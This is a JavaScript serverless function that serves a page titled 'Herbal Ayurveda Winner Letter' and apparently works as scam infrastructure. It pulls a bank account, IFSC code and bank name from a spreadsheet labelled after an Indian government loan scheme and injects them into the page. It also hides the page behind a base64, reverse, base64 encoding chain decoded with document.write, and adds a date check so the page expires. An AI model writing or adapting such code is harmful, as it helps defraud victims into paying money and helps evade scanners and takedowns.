// netlify/functions/page.js

export default async (req, res) => {
  const expiryId = "TRL";
  const sheetbaseApiUrl =
    "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
  const datetimeApiUrl = "https://datetimeapi.vercel.app/api/datetime.js";

  try {
    // --- fetch datetime ---
    const tRaw = await fetch(datetimeApiUrl);
    const tJson = await tRaw.json();
    if (!tJson.datetime) {
      return res.status(500).send("Datetime error");
    }
    const serverDatetime = tJson.datetime;

    // --- fetch sheetbase data ---
    const resp = await fetch(sheetbaseApiUrl);
    const json = await resp.json();

    const item = json.data.find((e) => e.id === expiryId);
    if (!item) {
      return res.status(404).send("Entry missing");
    }

    // --- expiry check ---
    if (new Date(serverDatetime) > new Date(item.date)) {
      return res.send("<h2>This Page is expired.</h2>");
    }

    // decode layers
    const decodedHTML = Buffer.from(item.html, "base64").toString();
    const decodedCSS =
      item.css ? Buffer.from(item.css, "base64").toString() : "";
    const decodedJS =
      item.init ? Buffer.from(item.init, "base64").toString() : "";

    // full HTML
    const fullPage = `
<link rel='stylesheet' href='data:text/css;base64,${Buffer.from(
      decodedCSS
    ).toString("base64")}'>
<script>
window.SERVER_EXPIRY=${JSON.stringify(item.date)};
window.SERVER_TIME=${JSON.stringify(serverDatetime)};
window.SERVER_ACC=${JSON.stringify(item.acc ?? "")};
window.SERVER_IFSC=${JSON.stringify(item.ifsc ?? "")};
window.SERVER_BANK=${JSON.stringify(item.bank ?? "")};
</script>

<script>
${decodedJS}
if (typeof initializePage === 'function') initializePage();
</script>

${decodedHTML}
`;

    // triple-layer encode
    const layerA = Buffer.from(fullPage).toString("base64");
    const layerB = layerA.split("").reverse().join("");
    const layerC = Buffer.from(layerB).toString("base64");

    const finalHTML = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Herbal Ayurveda Winner Letter</title>
  <script>
  (function(){
      try{
          const payload = "${layerC}";
          const step1 = atob(payload);
          const step2 = step1.split('').reverse().join('');
          const finalHtml = atob(step2);
          document.open();
          document.write(finalHtml);
          document.close();
      }catch(e){
          document.write("<h2>Page load error</h2>");
      }
  })();
  </script>
</head>
<body></body>
</html>`;

    return res.status(200).set("Content-Type", "text/html").send(finalHTML);
  } catch (e) {
    return res.status(500).send("Internal Server Error<br>" + e);
  }
};
